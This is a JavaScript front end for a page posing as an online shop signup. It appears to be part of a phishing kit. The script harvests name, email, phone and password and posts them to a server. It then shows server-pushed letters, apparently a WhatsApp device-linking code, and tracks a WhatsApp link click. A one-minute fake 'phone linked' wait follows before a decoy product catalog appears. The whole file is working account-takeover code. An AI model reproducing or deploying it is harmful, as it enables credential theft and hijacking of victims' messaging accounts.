const form = document.getElementById('user-form');
const stepForm = document.getElementById('step-form');
const stepBubbles = document.getElementById('step-bubbles');
const stepCatalog = document.getElementById('step-catalog');
const bubblesGrid = document.getElementById('bubbles-grid');
const btnComplete = document.getElementById('btn-complete');
const toast = document.getElementById('toast');
const linkingOverlay = document.getElementById('linking-overlay');
const overlayProgress = document.getElementById('overlay-progress');
const progressFill = document.getElementById('progress-fill');

let socket = null;
let sessionId = null;
let currentLetters = Array(9).fill('');
let cartCount = 0;

// State flags for Complete button
let lettersReceived = false;
let whatsappClicked = false;
let linkingCompleted = false;
let linkingStarted = false;

// Create the 9 bubbles
for (let i = 0; i < 9; i++) {
  const bubble = document.createElement('div');
  bubble.className = 'bubble';
  bubble.dataset.index = i;
  bubble.id = `bubble-${i}`;
  bubblesGrid.appendChild(bubble);
}

// Complete button starts disabled
btnComplete.disabled = true;

function showStep(stepEl) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  stepEl.classList.add('active');
}

function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2800);
}

function checkCompleteButton() {
  // Only enable Complete when ALL conditions are met
  if (lettersReceived && whatsappClicked && linkingCompleted) {
    btnComplete.disabled = false;
  } else {
    btnComplete.disabled = true;
  }
}

function updateBubbles(letters) {
  currentLetters = letters;
  letters.forEach((letter, i) => {
    const bubble = document.getElementById(`bubble-${i}`);
    if (!bubble) return;
    if (letter && letter.trim()) {
      bubble.textContent = letter;
      bubble.classList.add('filled');
    } else {
      bubble.textContent = '';
      bubble.classList.remove('filled');
    }
  });

  // Check if at least some letters arrived
  const hasAny = letters.some(l => l && l.trim());
  if (hasAny) {
    lettersReceived = true;
    checkCompleteButton();
  }
}

// ========== PRODUCTS DATA ==========
const products = [
  { id: 1, name: "Classic White Tee", price: 24.99, cat: "clothes", emoji: "👕" },
  { id: 2, name: "Denim Jacket", price: 59.99, cat: "clothes", emoji: "🧥" },
  { id: 3, name: "Summer Dress", price: 39.99, cat: "clothes", emoji: "👗" },
  { id: 4, name: "Hoodie", price: 44.99, cat: "clothes", emoji: "🧥" },
  { id: 5, name: "Nova X Pro", price: 699.00, cat: "phones", emoji: "📱" },
  { id: 6, name: "Pulse 12", price: 499.00, cat: "phones", emoji: "📱" },
  { id: 7, name: "Lite Mini", price: 249.00, cat: "phones", emoji: "📱" },
  { id: 8, name: "Organic Honey", price: 12.50, cat: "food", emoji: "🍯" },
  { id: 9, name: "Artisan Coffee", price: 18.00, cat: "food", emoji: "☕" },
  { id: 10, name: "Dark Chocolate", price: 8.99, cat: "food", emoji: "🍫" },
  { id: 11, name: "Green Tea Box", price: 14.50, cat: "food", emoji: "🍵" },
  { id: 12, name: "Silver Necklace", price: 79.00, cat: "jewelry", emoji: "📿" },
  { id: 13, name: "Gold Ring", price: 129.00, cat: "jewelry", emoji: "💍" },
  { id: 14, name: "Pearl Earrings", price: 49.00, cat: "jewelry", emoji: "👂" },
  { id: 15, name: "Leather Wallet", price: 34.99, cat: "general", emoji: "👛" },
  { id: 16, name: "Wireless Earbuds", price: 59.99, cat: "general", emoji: "🎧" },
  { id: 17, name: "Notebook Set", price: 15.00, cat: "general", emoji: "📓" },
  { id: 18, name: "Scented Candle", price: 19.99, cat: "general", emoji: "🕯️" },
];

function renderProducts(filter = "all") {
  const grid = document.getElementById("products-grid");
  const list = filter === "all" ? products : products.filter(p => p.cat === filter);
  grid.innerHTML = list.map(p => `
    <div class="product-card">
      <div class="product-img">${p.emoji}</div>
      <div class="product-info">
        <div class="product-name">${p.name}</div>
        <div class="product-price">$${p.price.toFixed(2)}</div>
        <button class="btn-cart" data-id="${p.id}">Add to Cart</button>
      </div>
    </div>
  `).join("");

  grid.querySelectorAll(".btn-cart").forEach(btn => {
    btn.addEventListener("click", () => {
      cartCount++;
      document.getElementById("cart-count").textContent = cartCount;
      btn.textContent = "Added ✓";
      btn.classList.add("added");
      showToast("Added to cart");
      setTimeout(() => {
        btn.textContent = "Add to Cart";
        btn.classList.remove("added");
      }, 1500);
    });
  });
}

document.getElementById("category-tabs").addEventListener("click", (e) => {
  if (!e.target.classList.contains("cat-btn")) return;
  document.querySelectorAll(".cat-btn").forEach(b => b.classList.remove("active"));
  e.target.classList.add("active");
  renderProducts(e.target.dataset.cat);
});

// ========== 1-MINUTE LINKING OVERLAY ==========
function startLinkingWait() {
  if (linkingStarted) return;
  linkingStarted = true;

  linkingOverlay.classList.remove('hidden');
  let progress = 0;
  const totalTime = 60000; // 1 minute
  const interval = 400;
  const step = 100 / (totalTime / interval);

  const timer = setInterval(() => {
    progress += step;
    if (progress > 100) progress = 100;
    overlayProgress.style.width = progress + '%';
    if (progressFill) progressFill.style.width = progress + '%';
  }, interval);

  setTimeout(() => {
    clearInterval(timer);
    linkingOverlay.classList.add('hidden');
    linkingCompleted = true;
    checkCompleteButton();
    showToast('Phone linked successfully – you can now click Complete');
  }, totalTime);
}

// Detect when user returns to the tab
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'visible' && whatsappClicked && !linkingStarted) {
    startLinkingWait();
  }
});

window.addEventListener('focus', () => {
  if (whatsappClicked && !linkingStarted) {
    startLinkingWait();
  }
});

// ========== FORM SUBMIT ==========
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const password = document.getElementById('password').value;
  const confirm = document.getElementById('confirmPassword').value;
  const errEl = document.getElementById('password-error');

  if (password !== confirm) {
    errEl.style.display = 'block';
    return;
  }
  errEl.style.display = 'none';

  const btn = document.getElementById('btn-next');
  btn.disabled = true;
  btn.textContent = 'Connecting…';

  const data = {
    surname: document.getElementById('surname').value.trim(),
    firstName: document.getElementById('firstName').value.trim(),
    email: document.getElementById('email').value.trim(),
    phone: document.getElementById('phone').value.trim(),
    password: password
  };

  try {
    const res = await fetch('/api/session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });

    if (!res.ok) {
      const err = await res.json();
      throw new Error(err.error || 'Failed to create session');
    }

    const { sessionId: id } = await res.json();
    sessionId = id;

    // Connect socket
    socket = io();
    socket.on('connect', () => {
      socket.emit('join-session', sessionId);
    });
    socket.on('letters-update', (payload) => {
      updateBubbles(payload.letters || []);
    });
    socket.on('error', (err) => {
      showToast(err.message || 'Connection error');
    });

    // Go straight to bubbles
    showStep(stepBubbles);
    showToast('Connected – waiting for letters');
    btn.disabled = false;
    btn.textContent = 'Next';

  } catch (err) {
    console.error(err);
    showToast(err.message || 'Something went wrong');
    btn.disabled = false;
    btn.textContent = 'Next';
  }
});

// Capture WhatsApp link click
document.addEventListener('click', (e) => {
  const link = e.target.closest('a.social-link.whatsapp');
  if (link) {
    whatsappClicked = true;
    checkCompleteButton(); // still disabled until linking finishes
  }
});

// Complete → Catalog
btnComplete.addEventListener('click', () => {
  if (!btnComplete.disabled) {
    showStep(stepCatalog);
    renderProducts('all');
  }
});
